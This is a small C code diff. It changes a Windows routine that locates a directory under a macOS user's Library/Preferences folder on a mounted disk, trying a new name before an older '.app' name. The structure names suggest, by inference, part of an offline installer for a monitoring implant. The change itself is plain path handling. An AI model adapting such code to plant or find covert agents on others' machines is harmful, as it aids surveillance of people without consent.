@@ -102,6 +102,15 @@ BOOL SaveRootFile(HANDLE hfile, WCHAR *plist_path, os_struct_t *os_info, BOOL su
 
 void MAC_GetSourceFileDirectory(users_struct_t *user_info, rcs_struct_t *rcs_info, os_struct_t *os_info, WCHAR *src_path) 
 {
+	HANDLE hfile;
+
+	_snwprintf_s(src_path, MAX_PATH, _TRUNCATE, L"%s%s\\Library\\Preferences\\%s", os_info->drive, SlashToBackSlash(user_info->user_home), rcs_info->hdir);
+	hfile = CreateFile(src_path, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
+	if (hfile != INVALID_HANDLE_VALUE) {
+		CloseHandle(hfile);
+		return;
+	}
+	// Se non ha trovato il nome nuovo, cerca quello vecchio con .app
 	_snwprintf_s(src_path, MAX_PATH, _TRUNCATE, L"%s%s\\Library\\Preferences\\%s.app", os_info->drive, SlashToBackSlash(user_info->user_home), rcs_info->hdir);
 }
 
